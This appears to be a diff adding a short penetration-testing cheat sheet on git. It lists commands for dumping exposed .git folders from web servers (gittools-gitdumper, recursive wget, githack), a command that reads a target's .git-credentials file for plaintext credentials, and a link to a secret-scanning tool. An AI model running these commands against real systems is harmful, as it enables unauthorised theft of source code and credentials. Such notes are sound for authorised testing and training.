@@ -1,0 +1,19 @@
+### git ###
+
+
+#################
+## git exposed ##
+#################
+gittools-gitdumper https://ss.domain.net/path/to/.git/ ./output/	# dump .git/ folder
+wget -r -np http://192.168.50.129/.git/					# DL recurs all files inside /.git/
+gittools-extractor . ./output/						# dump .git/ locally
+githack https://ss.domain.net/path/to/.git/				# get last versionned files
+cat /home/target/.git-credentials					# plain text creds
+
+
+###############
+## git leaks ##
+###############
+# fund secrets in commit
+https://github.com/kootenpv/gittyleaks
+
